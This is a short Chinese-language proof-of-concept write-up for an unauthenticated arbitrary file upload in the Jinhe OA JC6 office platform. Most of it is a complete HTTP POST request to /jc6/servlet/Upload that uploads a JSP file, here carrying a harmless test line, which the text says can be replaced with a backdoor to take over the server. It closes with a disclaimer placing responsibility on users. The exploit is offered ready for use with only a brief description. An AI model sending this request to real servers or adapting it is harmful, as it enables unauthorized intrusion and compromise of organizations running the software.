# jc6_upload
>   金和数字化智能办公平台（简称JC6）是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。

## 简介

金和OA jc6系统/jc6/servlet/Upload接口处存在任意文件上传漏洞，未经身份认证的攻击者可利用此漏洞上传恶意后门文件，最终可导致服务器失陷。

## 漏洞类型

文件上传

## 影响范围

-   金和OA jc6

## POC

```http
POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 197
Content-Type: multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d

--ee055230808ca4602e92d0b7c4ecc63d
Content-Disposition: form-data; name="img"; filename="1.jsp"
Content-Type: image/jpeg

<% out.println("tteesstt1"); %>
--ee055230808ca4602e92d0b7c4ecc63d--
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
